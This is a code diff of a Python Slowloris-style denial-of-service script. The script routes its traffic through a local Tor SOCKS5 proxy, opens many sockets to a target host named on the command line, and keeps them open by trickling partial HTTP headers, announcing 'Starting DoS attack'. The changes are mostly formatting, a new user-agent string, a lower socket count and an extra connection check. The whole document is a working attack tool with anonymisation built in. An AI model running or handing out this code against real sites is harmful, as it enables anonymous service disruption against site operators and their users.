@@ -1,13 +1,17 @@
-import socket, socks, random, time, sys
+import socket
+import socks
+import random
+import time
+import sys
 
 socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
 
-headers = [ 
-    "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0", 
-    "Accept-language: en-US,en"
+headers = [
+    "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0",
 ]
 
 sockets = []
+
 
 def setupSocket(ip):
     sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
@@ -20,13 +24,14 @@ def setupSocket(ip):
 
     return sock
 
+
 if __name__ == "__main__":
     if len(sys.argv) != 2:
         print("usage: python3 {} example.com".format(sys.argv[0]))
         sys.exit()
 
     ip = sys.argv[1]
-    count = 150
+    count = 15
     print("Starting DoS attack on {}. Connecting to {} sockets.".format(ip, count))
     print("wait until reach socket {}".format(count))
 
@@ -36,6 +41,9 @@ if __name__ == "__main__":
             sock = setupSocket(ip)
         except socket.error:
             print("error! socket doesn't connect")
+            if len(sockets) == 0:
+                print("May website do not accept connection")
+                sys.exit()
             break
 
         sockets.append(sock)
@@ -48,8 +56,9 @@ if __name__ == "__main__":
 
         for sock in list(sockets):
             try:
-                sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
+                sock.send(
+                    "X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
             except socket.error:
                 sockets.remove(sock)
-                
+
         time.sleep(1)
